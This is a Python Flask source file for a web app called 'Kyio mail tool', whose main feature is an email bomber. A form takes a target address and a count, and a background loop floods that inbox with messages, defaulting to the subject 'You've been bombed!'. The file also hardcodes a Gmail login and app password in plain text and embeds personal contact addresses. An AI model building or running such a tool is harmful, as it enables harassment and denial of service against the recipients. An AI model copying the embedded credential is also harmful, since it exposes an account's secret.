from flask import Flask, render_template_string, request, jsonify
import smtplib
from email.message import EmailMessage
import threading
import time
import datetime
import uuid

app = Flask(__name__)

# ================= CONFIG =================
FROM_EMAIL = "kyioautomationbot1@gmail.com"
APP_PASSWORD = "ocxkedkqixadqdqf"
SUPPORT_EMAIL = "rattanakbotphibal@gmail.com"
# =========================================

# Global state
logs = []
stats = {"total_sent": 0, "last_send_time": None}
active_tasks = []

def send_email_fn(to, subject, content):
    try:
        msg = EmailMessage()
        msg["From"] = FROM_EMAIL
        msg["To"] = to
        msg["Subject"] = subject
        msg.set_content(content)
        
        server = smtplib.SMTP("smtp.gmail.com", 587, timeout=15)
        server.ehlo()
        server.starttls()
        server.login(FROM_EMAIL, APP_PASSWORD)
        server.send_message(msg)
        server.quit()
        return True
    except Exception as e:
        print(f"Mail Error: {e}")
        return False

def send_emails_task(to_email, count, custom_msg, subject):
    global logs, stats
    task_id = f"{to_email}_{int(time.time())}"
    active_tasks.append(task_id)
    logs.append(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] 🚀 Initializing session for {to_email}...")
    
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587, timeout=15)
        server.ehlo()
        server.starttls()
        server.login(FROM_EMAIL, APP_PASSWORD)

        for i in range(count):
            try:
                msg = EmailMessage()
                msg["From"] = FROM_EMAIL
                msg["To"] = to_email
                msg["Subject"] = subject if subject else "You've been bombed!"
                msg.set_content(custom_msg if custom_msg else f"-- Kyio Automation. Security check #{i+1}")
                server.send_message(msg)
                logs.append(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] ✅ Success: Email {i+1}/{count} delivered.")
                stats["total_sent"] += 1
                stats["last_send_time"] = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            except Exception as e:
                logs.append(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] ❌ Error at {i+1}: {str(e)}")
            time.sleep(0.5)
        server.quit()
        logs.append(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] ✨ Mission Accomplished!")
    except Exception as e:
        logs.append(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] 🛑 SYSTEM ERROR: {str(e)}")
    finally:
        if task_id in active_tasks: active_tasks.remove(task_id)

@app.route('/')
def index():
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kyio mail tool</title>
    <style>
        :root {
            --bg-color: #0f0f12;
            --card-bg: #1a1a20;
            --accent: #7289da;
            --accent-hover: #5b6eae;
            --text: #e0e0e0;
            --success: #2ecc71;
            --error: #e74c3c;
            --border: #33333f;
        }
        body { font-family: 'Inter', sans-serif; background-color: var(--bg-color); color: var(--text); display: flex; justify-content: center; padding: 40px 20px; margin: 0; }
        .app-container { background-color: var(--card-bg); width: 100%; max-width: 600px; border-radius: 12px; border: 1px solid var(--border); overflow: hidden; display: flex; flex-direction: column; }
        .header { padding: 20px; background: linear-gradient(90deg, #7289da, #9b59b6); text-align: center; }
        .header h1 { margin: 0; font-size: 24px; letter-spacing: 1px; }
        .tabs { display: flex; background: #111116; border-bottom: 1px solid var(--border); }
        .tab-btn { flex: 1; padding: 15px; border: none; background: none; color: #888; cursor: pointer; transition: 0.3s; font-weight: 600; }
        .tab-btn.active { color: var(--accent); border-bottom: 2px solid var(--accent); background: rgba(114, 137, 218, 0.05); }
        .tab-content { padding: 25px; display: none; }
        .tab-content.active { display: block; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; color: #aaa; font-size: 14px; }
        input, textarea, select { width: 100%; padding: 12px; border-radius: 6px; border: 1px solid var(--border); background-color: #0f0f12; color: white; box-sizing: border-box; outline: none; }
        button.primary { width: 100%; padding: 14px; background-color: var(--accent); color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; }
        button.primary:hover { background-color: var(--accent-hover); }
        .social-section { margin-top: 30px; border-top: 1px solid var(--border); padding-top: 20px; text-align: center; }
        .social-link { display: inline-flex; align-items: center; margin: 0 15px; color: var(--accent); text-decoration: none; font-weight: bold; }
        .social-link:hover { text-decoration: underline; }
        #log-container { background-color: #08080a; border-radius: 6px; padding: 15px; height: 200px; overflow-y: auto; font-family: monospace; font-size: 12px; border: 1px solid #222; }
    </style>
</head>
<body>
    <div class="app-container">
        <div class="header"><h1>KYIO MAIL TOOL - Made with ❤️</h1></div>
        <div class="tabs">
            <button class="tab-btn active" onclick="showTab('mailer')">MAILER</button>
            <button class="tab-btn" onclick="showTab('support')">SUPPORT</button>
            <button class="tab-btn" onclick="showTab('stats')">STATS</button>
            <button class="tab-btn" onclick="showTab('logs')">LOGS</button>
        </div>

        <div id="mailer" class="tab-content active">
            <div class="form-group"><label>Target Email</label><input type="text" id="target_email"></div>
            <div class="form-group"><label>Subject</label><input type="text" id="subject"></div>
            <div class="form-group"><label>Count</label><input type="number" id="count" value="1"></div>
            <div class="form-group"><label>Message</label><textarea id="custom_msg" rows="3"></textarea></div>
            <button class="primary" onclick="sendEmails()">Send</button>
        </div>

        <div id="support" class="tab-content">
            <div class="form-group"><label>Your Name</label><input type="text" id="sup_name"></div>
            <div class="form-group"><label>Your Email</label><input type="text" id="sup_email"></div>
            <div class="form-group"><label>Issue Type</label><select id="sup_type"><option>General Inquiry</option><option>Technical Issue</option><option>Bug Report</option><option>Feedback</option></select></div>
            <div class="form-group"><label>Subject</label><input type="text" id="sup_subject"></div>
            <div class="form-group"><label>Message</label><textarea id="sup_msg" rows="3"></textarea></div>
            <button class="primary" id="sup_btn" onclick="submitTicket()">SUBMIT TICKET</button>
            <div id="sup_status" style="margin-top:15px; text-align:center;"></div>
            
            <div class="social-section">
                <p style="color:#666; font-size:12px; margin-bottom:15px;">CONNECT WITH US</p>
                <a href="https://t.me/devkyio" class="social-link" target="_blank">Telegram: @DevKyio</a>
                <a href="https://www.instagram.com/certifiedbatman28?igsh=ZzEwcDN2anZtZ2t6&utm_source=qr" class="social-link" target="_blank">Instagram: @Certifiedbatman28</a>
            </div>
        </div>

        <div id="stats" class="tab-content">
            <div style="text-align:center; padding:20px;">
                <div style="font-size:48px; color:var(--accent); font-weight:bold;" id="total_sent">0</div>
                <div style="color:#666;">Total Emails Transmitted</div>
                <div style="margin-top:20px; font-size:14px;">Last Transmission: <span id="last_time" style="color:var(--accent)">None</span></div>
            </div>
        </div>

        <div id="logs" class="tab-content">
            <div id="log-container"></div>
        </div>
    </div>

    <script>
        function showTab(tabId) {
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            document.getElementById(tabId).classList.add('active');
            event.target.classList.add('active');
        }

        function updateData() {
            fetch('/api/status').then(r => r.json()).then(data => {
                document.getElementById('total_sent').innerText = data.stats.total_sent;
                document.getElementById('last_time').innerText = data.stats.last_send_time || 'None';
                document.getElementById('log-container').innerHTML = data.logs.map(l => `<div>${l}</div>`).join('');
            });
        }

        function sendEmails() {
            const data = {
                email: document.getElementById('target_email').value,
                count: document.getElementById('count').value,
                subject: document.getElementById('subject').value,
                custom_msg: document.getElementById('custom_msg').value
            };
            fetch('/api/send', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(data) });
            showTab('logs');
        }

        function submitTicket() {
            const btn = document.getElementById('sup_btn');
            const status = document.getElementById('sup_status');
            const data = {
                name: document.getElementById('sup_name').value,
                email: document.getElementById('sup_email').value,
                type: document.getElementById('sup_type').value,
                subject: document.getElementById('sup_subject').value,
                message: document.getElementById('sup_msg').value
            };
            if(!data.name || !data.email || !data.message) { alert("Please fill name, email and message"); return; }
            
            btn.disabled = true; btn.innerText = "SUBMITTING...";
            fetch('/api/support', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(data) })
            .then(r => r.json()).then(res => {
                status.innerHTML = `<span style="color:var(--success)">✅ Ticket #${res.id} created! Confirmation sent.</span>`;
                btn.disabled = false; btn.innerText = "SUBMIT TICKET";
            }).catch(() => {
                status.innerHTML = `<span style="color:var(--error)">❌ Submission failed. Try again.</span>`;
                btn.disabled = false; btn.innerText = "SUBMIT TICKET";
            });
        }
        setInterval(updateData, 2000);
    </script>
</body>
</html>
''')

@app.route('/api/send', methods=['POST'])
def send():
    data = request.json
    threading.Thread(target=send_emails_task, args=(data.get('email'), int(data.get('count', 1)), data.get('custom_msg'), data.get('subject'))).start()
    return jsonify({"status": "started"})

@app.route('/api/support', methods=['POST'])
def support():
    data = request.json
    ticket_id = str(uuid.uuid4())[:8].upper()
    
    # 1. Send to personal inbox
    admin_content = f"New Support Ticket: #{ticket_id}\n\nName: {data['name']}\nEmail: {data['email']}\nType: {data['type']}\nSubject: {data['subject']}\n\nMessage:\n{data['message']}"
    send_email_fn(SUPPORT_EMAIL, f"SUPPORT TICKET: {data['subject']} [#{ticket_id}]", admin_content)
    
    # 2. Send confirmation to user
    user_content = f"Hello {data['name']},\n\nWe have received your support ticket #{ticket_id}. Our team will review it shortly.\n\nSummary:\nSubject: {data['subject']}\nMessage: {data['message']}\n\nBest regards,\nKyio Team"
    send_email_fn(data['email'], f"Ticket Confirmation [#{ticket_id}]", user_content)
    
    return jsonify({"id": ticket_id})

@app.route('/api/status')
def get_status():
    return jsonify({"logs": logs[-50:], "stats": stats})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
